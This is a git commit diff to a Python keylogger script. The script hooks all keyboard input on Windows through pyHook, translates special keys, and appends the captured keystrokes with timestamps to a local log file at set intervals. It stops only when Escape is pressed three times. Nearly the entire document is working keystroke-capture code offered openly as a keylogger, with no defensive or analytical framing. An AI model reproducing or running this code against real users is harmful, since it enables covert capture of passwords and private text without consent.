02d23971cee2e65b78fba3a8172d38e07508dc92
nip403 <41174986+nip403@users.noreply.github.com>
2019-01-09 14:57:37 +0000

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,37 +1,65 @@
 import pythoncom
 import pyHook
+import datetime
 import time
 import sys
 import os
 
 string = ""
 t0 = time.time()
+keymap = {
+    "Space":" ",
+    "Back":"<Backspace>",
+    "Return":"<Enter>",
+    "Up":"<Up>",
+    "Down":"<Down>",
+    "Left":"<Left>",
+    "Right":"<Right>",
+    "Escape":"<ESC>",
+    "Lshift":"<Shift>",
+    "Rshift":"<Shift>",
+    "Oem_Period":".",
+    "Oem_Comma":",",
+    "Oem_7":"#",
+    "Lcontrol":"<CTRL>",
+    "Delete":"<DEL>",
+    "Tab":"<TAB>",
+    "Capital":"<CAPS>",
+    "Oem_2":"/",
+    "Oem_1":";",
+    "Lwin":"<WIN>",
+    "Rmenu":"<ALT>",
+    "Lmenu":"<ALT>"
+}
 
 maxTime = None # if max = None, unlimited
-saveInterval = 1
+saveInterval = 0.2
 
 def keypressed(event):
     global string
-    
-    string += str(event.GetKey())
+    string += keymap.get(str(event.GetKey()),str(event.GetKey()))
     return True 
 
 obj = pyHook.HookManager()
 obj.KeyDown = keypressed
 obj.HookKeyboard()
 
-with open("keylog.txt","r+" if os.path.exists("keylog.txt") else "w+") as f:
+with open("keylog.txt","a+") as f:
     while True:
-        pythoncom.PumpWaitingMessages()
-        t1 = time.time()
+        try:
+            t1 = time.time()
+            pythoncom.PumpWaitingMessages()
+            
+            if not int(t1-t0) % (saveInterval*60) and int(t1-t0) and string:
+                f.write(f"[INTERVAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string}\n\n")
+                string = ""
 
-        if "Escape"*3 in string or (maxTime is not None and int((t1-t0)/60) >= maxTime):
-            break
+            elif keymap["Escape"]*3 in string or (maxTime is not None and t1-t0 >= maxTime * 60):
+                break
 
-        if not int((t1-t0)/60) % 2 and int((t1-t0)/60):
-            f.write(f.read()+string)
-            string = ""
+        except Exception as e:
+            print(e)
         
-    f.write(f.read()+string.strip("Escape"*3))
+    f.write(f"[MANUAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string[:-len(keymap['Escape'])*3]}\n\n")
     f.close()
     sys.exit()
